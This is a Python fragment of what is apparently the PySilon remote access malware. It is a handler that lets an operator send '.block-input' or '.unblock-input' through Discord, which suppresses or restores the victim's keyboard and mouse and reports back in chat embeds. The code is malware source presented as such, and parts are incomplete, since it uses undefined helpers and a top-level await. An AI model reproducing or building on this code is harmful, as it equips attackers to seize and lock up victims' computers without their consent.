from pynput import keyboard, mouse

# Listener variables outside the scope of the handlers
keyboard_listener = keyboard.Listener(suppress=True)
mouse_listener = mouse.Listener(suppress=True)

async def handle_block_unblock_input(message, input_blocked):
    title, description, color = "", "", ""
    #.log Message is "block input" / "unblock input"
    if message.content == '.block-input':
        if not input_blocked:
            #.log Input is not already blocked
            await message.delete()
            #.log Removed the message
            keyboard_listener.start()
            #.log Disabled keyboard
            mouse_listener.start()
            #.log Disabled mouse
            title, description, color = "ðŸš« Input Blocked", '```Input has been blocked. Unblock it by using .unblock-input```', discord.Colour.red()
            #.log Sent embed about blocked input
            input_blocked = True
        else:
            #.log Input is already blocked
            title, description, color = "ðŸ”´ Hold on!", '```The input is already blocked. Unblock it by using .unblock-input```', discord.Colour.red()
            #.log Sent embed about already blocked input

    elif message.content == '.unblock-input':
        if input_blocked:
            #.log Input is blocked
            await message.delete()
            #.log Removed the message
            keyboard_listener.stop()
            #.log Unblocked keyboard
            mouse_listener.stop()
            #.log Unblocked mouse
            title, description, color = "ðŸŸ¢ Input Unblocked", '```Input has been unblocked. Block it by using .block-input```', discord.Colour.green()
            #.log Sent embed about unblocked input
            input_blocked = False
        else:
            #.log Input is not blocked
            title, description, color = "ðŸ”´ Hold on!", '```The input is not blocked. Block it by using .block-input```', discord.Colour.red()
            #.log Sent embed about unblocked input
    
    embed = make_embed(title, description, color, "PySilon-malware")
    return await send_embed(embed)

# on message
if message.content in ['.block-input', '.unblock-input']:
    await handle_block_unblock_input(message, input_blocked)
